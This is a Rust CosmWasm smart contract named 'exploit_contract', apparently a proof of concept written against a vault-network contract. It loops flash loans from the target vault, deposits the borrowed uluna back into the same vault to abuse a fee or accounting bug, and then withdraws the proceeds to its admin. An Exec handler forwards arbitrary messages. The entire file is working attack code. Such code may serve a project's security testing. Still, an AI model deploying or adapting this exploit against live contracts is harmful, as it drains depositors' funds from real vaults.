use std::cmp::min;

use cosmwasm_std::{
    attr, entry_point, from_binary, to_binary, wasm_execute, Addr, BankMsg, Binary, CosmosMsg,
    Deps, DepsMut, Empty, Env, Fraction, MessageInfo, Response, StdError, Uint128, WasmMsg,
};
use cw2::{get_contract_version, set_contract_version};
use cw20::{BalanceResponse, Cw20ExecuteMsg, Cw20QueryMsg};
use cw_controllers::Admin;
use cw_storage_plus::Item;
use semver::Version;
use serde::{Deserialize, Serialize};

use vault_network::exploit::{ExecuteMsg, InstantiateMsg, MigrateMsg, QueryMsg};

use vault::state::Config;
use vault_network::vault::{self as VaultMsgs, Cw20HookMsg};

use crate::error::{ExploitError, StdResult};

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct State {
    vault_addr: Addr,
}

const STATE: Item<State> = Item::new("state");
const CONTRACT_NAME: &str = "exploit_contract";
const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");
const ADMIN: Admin = Admin::new("adminn");

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    msg: InstantiateMsg,
) -> StdResult<Response> {
    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;

    let state = State {
        vault_addr: deps.api.addr_validate(&msg.vault_addr)?,
    };

    STATE.save(deps.storage, &state)?;
    ADMIN.set(deps, Some(info.sender))?;

    Ok(Response::new().add_attributes(vec![attr("method", "instantiate")]))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn execute(deps: DepsMut, env: Env, info: MessageInfo, msg: ExecuteMsg) -> StdResult<Response> {
    match msg {
        ExecuteMsg::ExploitBug { loops } => exploit_bug(deps, env, info, loops),
        ExecuteMsg::Exec { msg } => {
            Ok(Response::new().add_message(from_binary::<CosmosMsg<Empty>>(&msg)?))
        }
        ExecuteMsg::Withdraw {} => {
            let admin = ADMIN.get(deps.as_ref())?.unwrap();
            // let native_coin = deps.querier.query_bonded_denom()?;
            let native_coin = "uluna".to_string();

            let balance = deps
                .querier
                .query_balance(env.contract.address, native_coin)?;
            Ok(Response::new().add_message(BankMsg::Send {
                to_address: admin.to_string(),
                amount: vec![balance],
            }))
        }
        ExecuteMsg::DepositAll {} => deposit_all(deps, env, info),
    }
}

fn exploit_bug(deps: DepsMut, env: Env, _info: MessageInfo, loops: u8) -> StdResult<Response> {
    // let native_coin = deps.querier.query_bonded_denom()?;
    let native_coin = "uluna".to_string();
    let balance = deps
        .querier
        .query_balance(env.contract.address.clone(), native_coin)?;

    let state = STATE.load(deps.storage)?;

    let config: Config = deps
        .querier
        .query_wasm_smart(state.vault_addr.clone(), &VaultMsgs::QueryMsg::Config {})?;
    let fees = config.fees;
    let lp_addr = config.liquidity_token.clone();

    let lp_balance: BalanceResponse = deps.querier.query_wasm_smart(
        lp_addr.clone(),
        &Cw20QueryMsg::Balance {
            address: env.contract.address.to_string(),
        },
    )?;
    if !lp_balance.balance.is_zero() {
        // first withdraw all
        let withdraw_msg = Cw20HookMsg::Withdraw {};
        let token_msg = WasmMsg::Execute {
            contract_addr: lp_addr.to_string(),
            msg: to_binary(&Cw20ExecuteMsg::Send {
                contract: state.vault_addr.to_string(),
                amount: lp_balance.balance,
                msg: to_binary(&withdraw_msg)?,
            })?,
            funds: vec![],
        };
        return Ok(Response::new()
            .add_message(token_msg)
            .add_message(wasm_execute(
                env.contract.address,
                &ExecuteMsg::ExploitBug { loops: loops },
                vec![],
            )?));
    }

    let vault_balance = deps
        .querier
        .query_balance(state.vault_addr.clone(), "uluna")?;
    if loops == 0 || balance.amount.is_zero() || vault_balance.amount.is_zero() {
        return Ok(Response::new());
    }
    let amount_to_borrow = (balance.amount
        * ((fees.flash_loan_fee.share + fees.protocol_fee.share)
            .inv()
            .unwrap()))
        - Uint128::new(1);

    let amount_to_borrow = min(amount_to_borrow.u128(), vault_balance.amount.u128());

    println!("amount_to_borrow: {}", amount_to_borrow);

    let borrow_msg = VaultMsgs::ExecuteMsg::FlashLoan {
        amount: amount_to_borrow.into(),
        msg: to_binary(&ExecuteMsg::DepositAll {})?,
    };

    let next_loop = ExecuteMsg::ExploitBug { loops: loops - 1 };

    Ok(Response::new()
        .add_message(wasm_execute(state.vault_addr, &borrow_msg, vec![])?)
        .add_message(wasm_execute(env.contract.address, &next_loop, vec![])?))
}

fn deposit_all(deps: DepsMut, env: Env, _info: MessageInfo) -> StdResult<Response> {
    let native_coin = "uluna".to_string();
    // let native_coin = deps.querier.query_bonded_denom()?;
    let balance = deps
        .querier
        .query_balance(env.contract.address, native_coin)?;

    let state = STATE.load(deps.storage)?;
    let deposit_msg = VaultMsgs::ExecuteMsg::Deposit {
        amount: balance.amount,
    };

    let msg = wasm_execute(state.vault_addr, &deposit_msg, vec![balance])?;

    Ok(Response::new().add_message(msg))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn migrate(deps: DepsMut, _env: Env, _msg: MigrateMsg) -> StdResult<Response> {
    let version: Version = CONTRACT_VERSION
        .parse()
        .map_err(|_| StdError::parse_err("Version", "Failed to parse version"))?;
    let storage_version: Version = get_contract_version(deps.storage)?
        .version
        .parse()
        .map_err(|_| StdError::parse_err("Version", "Failed to parse storage_version"))?;

    if storage_version > version {
        return Err(ExploitError::MigrateInvalidVersion {
            new_version: storage_version,
            current_version: version,
        });
    }

    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;
    Ok(Response::default())
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn query(_deps: Deps, _env: Env, _msg: QueryMsg) -> StdResult<Binary> {
    Err(StdError::generic_err("nah").into())
}
